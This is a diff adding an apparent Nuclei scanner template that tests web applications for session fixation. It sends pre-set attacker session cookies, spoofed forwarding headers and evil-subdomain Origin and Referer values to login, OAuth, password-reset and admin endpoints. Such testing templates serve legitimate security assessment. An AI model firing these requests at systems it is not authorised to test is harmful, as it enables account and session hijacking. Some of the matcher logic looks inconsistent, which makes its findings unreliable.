@@ -1,0 +1,386 @@
+id: medium-webapp-session-fixation-subdomain
+
+info:
+  name: Session Fixation via Subdomain - Elite Red Team
+  author: elite-red-team
+  severity: medium
+  description: |
+    Advanced session fixation attacks via subdomain manipulation.
+    Tests for session fixation vulnerabilities across subdomains and cookie scope issues.
+    Includes multiple session hijacking techniques and cross-subdomain exploitation methods.
+  reference:
+    - https://owasp.org/www-community/attacks/Session_fixation
+    - https://portswigger.net/web-security/authentication/other-mechanisms
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-384
+  tags: session-fixation,subdomain,cookie-hijacking,red-team
+
+variables:
+  # Malicious session IDs for fixation
+  fixed_session_ids:
+    - "ATTACKER_CONTROLLED_SESSION_123"
+    - "EVIL_SESSION_456789"
+    - "HIJACKED_SID_ABC123"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth/login"
+      - "{{BaseURL}}/signin"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+      # Pre-set session cookie from attacker-controlled subdomain
+      Cookie: PHPSESSID=ATTACKER_CONTROLLED_SESSION_123; sessionid=EVIL_SESSION_456789
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "login"
+          - "signin"
+          - "username"
+          - "password"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - 'Set-Cookie:\s*([^;\r\n]+)'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth/login"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      # Session fixation attempt with pre-set cookie
+      Cookie: JSESSIONID=ATTACKER_CONTROLLED_SESSION_123; PHPSESSID=EVIL_SESSION_456789
+      X-Forwarded-Proto: https
+
+    body: |
+      username=victim&password=victim_password
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "welcome"
+          - "dashboard"
+          - "logged in"
+          - "success"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "ATTACKER_CONTROLLED_SESSION_123"
+          - "EVIL_SESSION_456789"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/dashboard"
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/admin"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      # Use the fixed session ID
+      Cookie: sessionid=ATTACKER_CONTROLLED_SESSION_123
+      X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "dashboard"
+          - "profile"
+          - "admin"
+          - "welcome"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "login"
+          - "signin"
+          - "unauthorized"
+        condition: and
+        negative: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/session/create"
+      - "{{BaseURL}}/api/session"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      # Force session creation with attacker-controlled ID
+      X-Session-ID: HIJACKED_SID_ABC123
+      X-Forwarded-Host: evil.{{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: header
+        words:
+          - "HIJACKED_SID_ABC123"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/oauth/callback"
+      - "{{BaseURL}}/oauth/callback"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      # Session fixation in OAuth callback
+      Cookie: state=ATTACKER_STATE; session=FIXED_SESSION_789
+      Origin: https://evil.{{Hostname}}
+
+    body: |
+      code=oauth_auth_code&state=ATTACKER_STATE
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: header
+        words:
+          - "FIXED_SESSION_789"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/logout"
+      - "{{BaseURL}}/auth/logout"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      Cookie: PHPSESSID=ATTACKER_CONTROLLED_SESSION_123
+      X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: header
+        words:
+          - "ATTACKER_CONTROLLED_SESSION_123"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "expires="
+          - "Max-Age=0"
+        condition: and
+        negative: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/password-reset"
+      - "{{BaseURL}}/forgot-password"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      # Session fixation in password reset
+      Cookie: reset_session=EVIL_RESET_SESSION_999
+      Referer: https://evil.{{Hostname}}/reset
+
+    body: |
+      email=victim@example.com
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "EVIL_RESET_SESSION_999"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/session"
+      - "{{BaseURL}}/session/info"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      Cookie: sid=ATTACKER_SID_XYZ789
+      X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "ATTACKER_SID_XYZ789"
+          - "session"
+          - "user"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/session/validate"
+      - "{{BaseURL}}/session/check"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      Cookie: token=FIXED_TOKEN_123456
+
+    body: |
+      {
+        "session_id": "FIXED_TOKEN_123456",
+        "user_id": "victim_user",
+        "timestamp": "2024-01-01T00:00:00Z"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "valid"
+          - "authenticated"
+          - "FIXED_TOKEN_123456"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/users"
+      - "{{BaseURL}}/api/admin/dashboard"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      # Test admin access with fixed session
+      Cookie: admin_session=HIJACKED_ADMIN_SESSION_777
+      X-Forwarded-Host: admin.{{Hostname}}
+      X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "users"
+          - "dashboard"
+          - "management"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "unauthorized"
+          - "forbidden"
+          - "access denied"
+        condition: and
+        negative: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/preferences"
+      - "{{BaseURL}}/settings/save"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      Cookie: user_session=ATTACKER_USER_SESSION_888
+
+    body: |
+      {
+        "theme": "dark",
+        "language": "en",
+        "notifications": true,
+        "session_id": "ATTACKER_USER_SESSION_888"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "saved"
+          - "updated"
+          - "preferences"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - 'Set-Cookie:\s*([^=]+)=([^;\r\n]+)'
+          - 'Domain=([^;\r\n]+)'
+          - 'Path=([^;\r\n]+)'
+
+      - type: regex
+        part: body
+        regex:
+          - '"session_id":\s*"([^"]+)"'
+          - '"token":\s*"([^"]+)"'
+          - 'sessionStorage\.setItem\(["\']([^"\']+)["\']'
